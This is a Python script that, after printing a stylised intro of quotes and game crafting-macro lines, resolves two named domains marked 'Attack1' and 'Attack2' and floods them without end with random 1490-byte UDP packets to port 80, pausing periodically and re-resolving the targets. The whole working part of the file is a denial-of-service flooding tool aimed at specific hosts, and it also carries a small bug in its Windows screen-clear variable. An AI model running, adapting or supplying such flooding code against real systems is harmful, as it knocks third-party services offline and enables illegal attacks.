
# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime



# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# Cast
os.system(cmd_clear)
print('\033[1;34mTo all of my children in whom Life flows abundant...')
time.sleep(1)
print('\033[1;34mTo all of my children to whom Death hath passed his judgement...')
time.sleep(1)
print('\033[1;34mThe soul yearns for honor, and the flesh the hereafter...')
time.sleep(1)
print('\033[1;34mLook to those who walked before to lead those who walk after...')
time.sleep(1)
print('')
time.sleep(1)
print('\033[1;34mHear...Feel...Think...')
time.sleep(2)
print('\033[0m-----------------------------------')
time.sleep(1)
print('\033[1;36m/ac Reflect <wait.3>')
time.sleep(1)
print('\033[1;36m/ac Manipulation <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Great Strides <wait.2>')
time.sleep(1)
print("\033[1;36m/ac Byregot's Blessing <wait.3>")
time.sleep(1)
print('\033[1;36m/ac Great Veneration <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Groundwork <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Groundwork')
time.sleep(1)

# Get ip.
url1 = "fwess.top"
ip1 = socket.gethostbyname(url1)
url2 = "ffwecc.top"
ip2 = socket.gethostbyname(url2)

print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url1))
print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(url2))
time.sleep(1)

# Value.
sent = 0
i = 590
timeR = i + random.randint(0,20)
now = datetime.datetime.now()
dtime = now.strftime("%Y-%m-%d %H:%M:%S")

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
#port = 1
port = 80

#ululu alala
if port_mode == False:  # All ports.
    try:
        while True:
            if sent == 65535:                
                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip1, port))
                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip2, port))
                print('\033[1;36m/wait %s'%(timeR))
                #port = 1
                time.sleep(timeR)
                ip1 = socket.gethostbyname(url1)
                ip2 = socket.gethostbyname(url2)

            elif port == 1900:
                port = 1901

            
            sock.sendto(bytes, (str(ip1), port))
            sock.sendto(bytes, (str(ip2), port))
            sent += 1
            #port += 1
            timeR = i + random.randint(0,20)
            now = datetime.datetime.now()
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            # print('\033[32;1m[%s]Sented %s packets to IPs port:%s\033[0m'%(dtime, sent, port))
            
            
    except:
        print('\n\033[31;1mExited\033[0m')
